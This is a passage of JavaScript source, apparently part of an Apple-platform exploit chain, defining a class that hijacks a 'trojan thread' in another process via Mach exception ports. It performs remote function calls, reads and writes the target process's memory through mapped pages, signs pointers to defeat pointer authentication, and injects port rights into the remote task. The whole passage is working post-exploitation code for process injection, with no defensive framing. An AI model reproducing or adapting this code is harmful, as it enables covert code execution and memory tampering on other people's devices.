		Exception.replyWithState(exc, newState, false);
	
		return retValue;
	}

	call(
		timeout,
		pc,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		//console.log(TAG, `call(${Utils.hex(pc)}, ${Utils.hex(x0)}, ${Utils.hex(x1)}, ${Utils.hex(x2)}, ${Utils.hex(x3)})`);
		return this.#doRemoteCallStable(timeout, pc, x0, x1, x2, x3, x4, x5, x6, x7);
	}

	#restoreTrojanThread(state)
	{
		let excBuffer = Native.mem;
		if (!Exception.waitException(this.#firstExceptionPort, excBuffer, 20000, false))
		{
			console.log(TAG,`Failed to receive first exception while restoring`);
			return false;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		state.opaque_flags = exc.threadState.opaque_flags;
		state = this.#signState(this.#trojanThreadAddr, state,state.opaque_pc,state.opaque_lr);
		Exception.replyWithState(exc, state, false);
		return true;
	}

	destroy()
	{
		this.#doRemoteCallStable(100, "munmap", this.#trojanMem, Utils.PAGE_SIZE);
		if (this.#creatingExtraThread)
			this.#doRemoteCallStable(-1, "pthread_exit");
		else
			this.#restoreTrojanThread(this.#originalState);
		Native.callSymbol("mach_port_destruct", 0x203, this.#firstExceptionPort, 0n, 0n);
		Native.callSymbol("mach_port_destruct", 0x203, this.#secondExceptionPort, 0n, 0n);
		Native.callSymbol("pthread_cancel", this.#dummyThread);
	}

	read(src, dst, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		//console.log(TAG, `read(): src=${Utils.hex(src)}, dst=${Utils.hex(dst)}, size=${size}`);
		let until = src + size;
		while (src < until)
		{
			size = until - src;
			let offs = src & Utils.PAGE_MASK;
			let copyCount =  Utils.MIN(Task.round_page(src + 1n) - src, size);
			let pageAddr = Task.trunc_page(src);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				console.log(TAG, "read() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
			Native.callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
	
			src += copyCount;
			dst += copyCount;
		}
		return true;
	}

	write(dst, src, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		let until = dst + size;

		//console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);
	
		while (dst < until)
		{
			size = until - dst;
			let offs = dst & Utils.PAGE_MASK;
			let copyCount = Utils.MIN(Task.round_page(dst + 1n) - dst, size);
			let pageAddr = Task.trunc_page(dst);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				console.log(TAG, "write() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
			Native.callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
	
			dst += copyCount;
			src += copyCount;
		}
		return true;	
	}

	writeStr(dst, str)
	{
		if (!str)
			return false;
		//return this.write(dst, Native.getCString(str), str.length + 1);
		let mem = Native.callSymbol("malloc", str.length + 1);
		Native.writeString(mem, str);
		const ret = this.write(dst, mem, str.length + 1);
		Native.callSymbol("free", mem);
		return ret;
	}

	read64(src)
	{
		if (!this.read(src, Native.mem, Utils.UINT64_SIZE))
			return false;
		const buff = Native.read(Native.mem, Utils.UINT64_SIZE);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	write64(dst, val)
	{
		const buff = new ArrayBuffer(Utils.UINT64_SIZE);
		const view = new DataView(buff);
		view.setBigUint64(0, val, true);
		Native.write(Native.mem, buff);
		return this.write(dst, Native.mem, Utils.UINT64_SIZE);
	}

	mem()
	{
		return this.#trojanMem;
	}

	pac(address,modifier)
	{
		return PAC.remotePAC(this.#trojanThreadAddr, address, modifier);
	}

	insertRight(port, right)
	{
		//console.log(TAG, "Insert right: " + Utils.hex(port));

		const MACH_MSG_TYPE_COPY_SEND = 19;

		let msgBuff = new ArrayBuffer(24);
		let msg = new MachMsgHeaderStruct(msgBuff);
		msg.msgh_id = 0x4141;
		msg.msgh_remote_port = this.#localPort;
		msg.msgh_local_port = port;
		msg.msgh_size = 24;
		msg.msgh_bits = MachMsgHeaderStruct.MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, right);

		Native.write(Native.mem, msgBuff);
		let ret = Native.callSymbol("mach_msg_send", Native.mem);
		if (ret != 0) {
			let errString = Native.callSymbol("mach_error_string", ret);
			errString = Native.readString(errString);
			console.log(TAG, "insertRight: error while sending message: " + errString);
			return 0;
		}
		
		//TODO receive in remote task
		msg.msgh_size = 0x100;
		msg.msgh_local_port = this.#remotePort;
		Native.write(Native.mem, msgBuff);
		this.write(this.#trojanMem, Native.mem, 24);

		ret = this.#doRemoteCallStable(100, "mach_msg_receive", this.#trojanMem);
		if (ret != 0) {
			let errString = Native.callSymbol("mach_error_string", ret);
			errString = Native.readString(errString);
			console.log(TAG, "insertRight: error while receiving message: " + errString);
			return 0;
		}

		this.read(this.#trojanMem, Native.mem + 0x100n, 24);
		let recvBuff = Native.read(Native.mem + 0x100n, 24);
		let recvMsg = new MachMsgHeaderStruct(recvBuff);
		//console.log(TAG, "Recv msg id: " + Utils.hex(recvMsg.msgh_id));
		//console.log(TAG, "Recv remote port: " + Utils.hex(recvMsg.msgh_remote_port));

		ret = this.#doRemoteCallStable(100, "fileport_makefd", recvMsg.msgh_remote_port);
		if (ret < 0) {
			console.log(TAG, "insertRight: error with fileport_makefd");
			return 0;
		}
		//console.log(TAG, "Remote fileport_makefd: " + ret);

		return ret;
	}

	#putShmemInCache(shmem)
	{
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if (!this.#shmemCache[i])
			{
				// TODO encapsulate this inside shmem struct
				let shmemBuff = new ArrayBuffer(0x18);
				this.#shmemCache[i] = new VMShmem(shmemBuff);
				this.#shmemCache[i].port = shmem.port;
				this.#shmemCache[i].localAddress = shmem.localAddress;
				this.#shmemCache[i].remoteAddress = shmem.remoteAddress;
				return this.#shmemCache[i];
			}
		}
		return null;
	}

	#getShmemForPage(pageAddr)
	{
		let remotePage = this.#getShmemFromCache(pageAddr);
		if (!remotePage)
		{
			//console.log(TAG, `Page not found in cache: ${Utils.hex(pageAddr)}`);
			let newRemotePage = VM.mapRemotePage(this.#vmMap, pageAddr);
			if (!newRemotePage || !newRemotePage.localAddress)
				return false;
			return this.#putShmemInCache(newRemotePage);
		}
		//console.log(TAG, `Page found in cache: ${Utils.hex(pageAddr)}`);
		return remotePage;
	}

	#getShmemFromCache(pageAddr)
	{
		//console.log(TAG,`getShmemFromCache(): pageAddr=${Utils.hex(pageAddr)}`);
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if(this.#shmemCache[i])
				if (this.#shmemCache[i].remoteAddress === pageAddr)
					return this.#shmemCache[i];
		}
		return null;
	}
	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100n;
		Native.writeString(dst, str);
		return Native.callSymbol("CFStringCreateWithCString", 0n, dst, kCFStringEncodingUTF8);
	}

	#EXC_GUARD_ENCODE_TYPE(code, type)
	{
		code |= ((type & BigInt('0x7')) << 61n);
		return code;
	}

	#EXC_GUARD_ENCODE_FLAVOR(code, flavor)
	{
		code |= ((flavor & BigInt('0x1fffffff')) << 32n);
		return code;
	}
	
	#EXC_GUARD_ENCODE_TARGET(code, target)
	{
		code |= target & BigInt('0xffffffff');
		return code;
	}
}